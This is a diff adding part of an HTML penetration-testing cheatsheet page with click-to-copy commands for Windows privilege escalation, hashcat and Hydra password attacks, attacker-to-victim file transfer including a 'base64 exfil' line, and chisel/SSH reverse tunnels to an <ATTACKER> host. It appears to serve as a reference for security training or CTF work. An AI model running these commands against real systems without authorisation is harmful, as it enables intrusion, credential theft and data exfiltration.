+        <div class="cs-card-hdr"><span class="cs-card-title">Windows PrivEsc</span><div class="cs-card-tags"><span class="tag tag-orange">Windows</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">&gt;</span><span class="ct"><span class="kw">whoami</span> /priv<span class="desc">current privileges</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">&gt;</span><span class="ct"><span class="kw">net user</span>; <span class="kw">net localgroup administrators</span><span class="desc">users and admins</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">&gt;</span><span class="ct"><span class="kw">schtasks</span> /query /fo LIST /v<span class="desc">scheduled tasks</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">iwr</span> <span class="tgt">http://&lt;IP&gt;/winpeas.exe</span> <span class="flg">-OutFile</span> <span class="arg">wp.exe</span>; .\wp.exe<span class="desc">WinPEAS</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>SeImpersonatePrivilege</strong> → JuicyPotato / PrintSpoofer / GodPotato</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══════ 06 HASHES ═══════ -->
+  <div class="cs-category" id="cs-hashes">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-teal">06</span>
+      <span class="cs-cat-title">Hashes &amp; Credentials</span>
+      <span class="cs-cat-meta">hashcat · john · hydra · hashid</span>
+    </div>
+    <div class="cs-grid">
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Hashcat Modes</span><div class="cs-card-tags"><span class="tag tag-teal">hashcat</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 0</span>     hash.txt <span class="arg">rockyou.txt</span><span class="desc">MD5</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 100</span>   hash.txt <span class="arg">rockyou.txt</span><span class="desc">SHA1</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 1000</span>  hash.txt <span class="arg">rockyou.txt</span><span class="desc">NTLM</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 5600</span>  hash.txt <span class="arg">rockyou.txt</span><span class="desc">NTLMv2</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 13100</span> hash.txt <span class="arg">rockyou.txt</span><span class="desc">Kerberoast TGS</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 18200</span> hash.txt <span class="arg">rockyou.txt</span><span class="desc">AS-REP roast</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 1800</span>  hash.txt <span class="arg">rockyou.txt</span><span class="desc">sha512crypt ($6$)</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 3200</span>  hash.txt <span class="arg">rockyou.txt</span><span class="desc">bcrypt</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashid</span> <span class="arg">'$hash'</span><span class="desc">identify hash type</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Hydra Bruteforce</span><div class="cs-card-tags"><span class="tag tag-red">hydra</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hydra</span> <span class="flg">-l</span> <span class="arg">admin</span> <span class="flg">-P</span> <span class="arg">rockyou.txt</span> <span class="tgt">ssh://&lt;IP&gt;</span><span class="desc">SSH</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hydra</span> <span class="flg">-l</span> <span class="arg">admin</span> <span class="flg">-P</span> <span class="arg">rockyou.txt</span> <span class="tgt">ftp://&lt;IP&gt;</span><span class="desc">FTP</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hydra</span> <span class="flg">-l</span> <span class="arg">admin</span> <span class="flg">-P</span> <span class="arg">rockyou.txt</span> <span class="tgt">&lt;IP&gt;</span> http-post-form <span class="str">"/login:user=^USER^&pass=^PASS^:F=invalid"</span><span class="desc">HTTP form</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hydra</span> <span class="flg">-L</span> <span class="arg">users.txt</span> <span class="flg">-P</span> <span class="arg">pass.txt</span> <span class="flg">-t 4</span> <span class="tgt">smb://&lt;IP&gt;</span><span class="desc">SMB</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══════ 07 FILE OPS ═══════ -->
+  <div class="cs-category" id="cs-fileops">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-green">07</span>
+      <span class="cs-cat-title">File Transfer</span>
+      <span class="cs-cat-meta">http · smb · nc · base64</span>
+    </div>
+    <div class="cs-grid">
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Serve Files (Attacker)</span><div class="cs-card-tags"><span class="tag tag-green">serve</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">python3</span> <span class="flg">-m</span> http.server <span class="arg">80</span><span class="desc">quick HTTP server</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">impacket-smbserver</span> <span class="arg">share</span> . <span class="flg">-smb2support</span><span class="desc">SMB share</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nc</span> <span class="flg">-lvnp</span> <span class="arg">4444</span> &lt; file.txt<span class="desc">send via nc</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Download Files (Victim)</span><div class="cs-card-tags"><span class="tag tag-blue">get</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">wget</span> <span class="tgt">http://&lt;IP&gt;/file</span> <span class="flg">-O</span> <span class="arg">/tmp/file</span><span class="desc">wget</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">curl</span> <span class="tgt">http://&lt;IP&gt;/file</span> <span class="flg">-o</span> <span class="arg">/tmp/file</span><span class="desc">curl</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">copy</span> <span class="tgt">\\&lt;IP&gt;\share\file.exe</span> .<span class="desc">Windows: SMB copy</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">cat</span> file | <span class="kw">base64</span>; echo "---"; <span class="kw">echo</span> <span class="arg">b64</span> | <span class="kw">base64 -d</span><span class="desc">base64 exfil</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════ 08 PIVOTING ═══════ -->
+  <div class="cs-category" id="cs-pivot">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-muted">08</span>
+      <span class="cs-cat-title">Pivoting &amp; Tunneling</span>
+      <span class="cs-cat-meta">ssh · chisel · ligolo · proxychains</span>
+    </div>
+    <div class="cs-grid">
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">SSH Tunnels</span><div class="cs-card-tags"><span class="tag tag-blue">SSH</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">ssh</span> <span class="flg">-L</span> <span class="arg">8080</span>:<span class="tgt">127.0.0.1</span>:<span class="arg">80</span> user@<span class="tgt">&lt;IP&gt;</span><span class="desc">local forward: :8080 → victim:80</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">ssh</span> <span class="flg">-R</span> <span class="arg">4444</span>:<span class="tgt">127.0.0.1</span>:<span class="arg">4444</span> user@<span class="tgt">&lt;ATTACKER&gt;</span><span class="desc">remote port forward</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">ssh</span> <span class="flg">-D</span> <span class="arg">1080</span> user@<span class="tgt">&lt;IP&gt;</span><span class="desc">dynamic SOCKS proxy</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">proxychains</span> nmap <span class="flg">-sT -Pn</span> <span class="tgt">10.10.10.0/24</span><span class="desc">scan via proxy</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Chisel</span><div class="cs-card-tags"><span class="tag tag-purple">chisel</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="cm"># attacker</span></span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">./chisel</span> server <span class="flg">-p</span> <span class="arg">8000</span> <span class="flg">--reverse</span><span class="desc">start server</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="cm"># victim</span></span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">./chisel</span> client <span class="tgt">&lt;ATTACKER&gt;</span>:<span class="arg">8000</span> R:socks<span class="desc">reverse SOCKS5</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">./chisel</span> client <span class="tgt">&lt;ATTACKER&gt;</span>:<span class="arg">8000</span> R:<span class="arg">80</span>:<span class="tgt">127.0.0.1</span>:<span class="arg">80</span><span class="desc">forward port</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>then:</strong> set proxychains to socks5 127.0.0.1 1080 in /etc/proxychains4.conf</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="no-res" id="cs-no-res">
+    <div style="font-size:28px;margin-bottom:10px">⌕</div>
+    no commands matching that search
+  </div>
+
+</div><!-- /page-content -->
+<script>
+  initPage({
+    title: 'Cheatsheets',
+    breadcrumb: 'cheatsheets',
+    tags: [{ label: '8 categories', color: 'green' }, { label: 'click to copy', color: 'blue' }],
+    extraSb: `
+      <div style="padding:13px 10px 6px;border-top:1px solid var(--border)">
+        <div class="sb-sec-lbl">jump to</div>
+        <a href="#cs-recon"   class="sb-item"><span class="sb-icon" style="color:var(--accent)">▸</span>Recon</a>
+        <a href="#cs-web"     class="sb-item"><span class="sb-icon" style="color:var(--orange)">▸</span>Web</a>
+        <a href="#cs-ad"      class="sb-item"><span class="sb-icon" style="color:var(--yellow)">▸</span>SMB / AD</a>
+        <a href="#cs-shells"  class="sb-item"><span class="sb-icon" style="color:var(--red)">▸</span>Shells</a>
+        <a href="#cs-privesc" class="sb-item"><span class="sb-icon" style="color:var(--purple)">▸</span>PrivEsc</a>
+        <a href="#cs-hashes"  class="sb-item"><span class="sb-icon" style="color:var(--teal)">▸</span>Hashes</a>
+        <a href="#cs-fileops" class="sb-item"><span class="sb-icon" style="color:var(--green)">▸</span>File Ops</a>
+        <a href="#cs-pivot"   class="sb-item"><span class="sb-icon" style="color:var(--muted)">▸</span>Pivoting</a>
+      </div>`,
+  });
+
+  // ── COPY ──
+  document.querySelectorAll('.cl').forEach(el => {
+    el.addEventListener('click', () => {
+      const raw = el.querySelector('.ct').innerText.trim();
+      if (raw.startsWith('#') || raw.startsWith('//')) return;
+      navigator.clipboard?.writeText(raw).then(() => {
+        el.classList.add('copied');
+        const hint = el.querySelector('.hint');
+        if (hint) { hint.textContent = '✓'; hint.style.color = 'var(--green)'; hint.style.opacity = '1'; }
+        setTimeout(() => {
+          el.classList.remove('copied');
+          if (hint) { hint.textContent = 'copy'; hint.style.color = ''; hint.style.opacity = ''; }
+        }, 1500);
+      });
+    });
+  });
+
+  // ── SEARCH ──
+  const cards = document.querySelectorAll('.cs-card');
+  const cats  = document.querySelectorAll('.cs-category');
+  const count = document.getElementById('cs-count');
+  const noRes = document.getElementById('cs-no-res');
+
+  function updateCount() {
+    count.textContent = document.querySelectorAll('.cs-card:not(.hidden)').length;
+  }
+  updateCount();
+
+  document.getElementById('cs-q').addEventListener('input', function() {
+    const q = this.value.toLowerCase().trim();
+    let any = false;
+    cards.forEach(c => {
+      const match = !q || c.textContent.toLowerCase().includes(q);
+      c.classList.toggle('hidden', !match);
+      if (match) any = true;
+    });
+    cats.forEach(cat => {
+      const vis = cat.querySelectorAll('.cs-card:not(.hidden)').length;
+      cat.style.display = (vis === 0 && q) ? 'none' : '';
+    });
+    noRes.style.display = (!any && q) ? 'block' : 'none';
+    updateCount();
+  });
+</script>
+</body>
+</html>
